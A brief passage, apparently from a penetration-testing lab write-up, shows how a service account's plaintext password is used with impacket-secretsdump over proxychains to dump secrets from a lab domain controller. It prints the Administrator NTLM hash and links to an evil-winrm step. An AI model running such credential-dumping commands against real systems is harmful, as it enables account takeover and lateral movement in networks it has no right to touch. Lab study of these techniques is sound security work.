
## With svcBackups
Perform the same technique and dump secrets from the CORPDC machine, we will use the `svcBackups` account.

## Dump hashes from the `CORPDC` machine

$ `proxychains -q /usr/bin/impacket-secretsdump corp.thereserve.loc/svcBackups:'q9nzssaFtGHdqUV3Qv6G'@10.200.113.102`

![[Dumping secrets from CORPDC-20240601064020744.webp]]

Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e:::

**Next step:** [[Connect CORPDC with evil-winrm]]



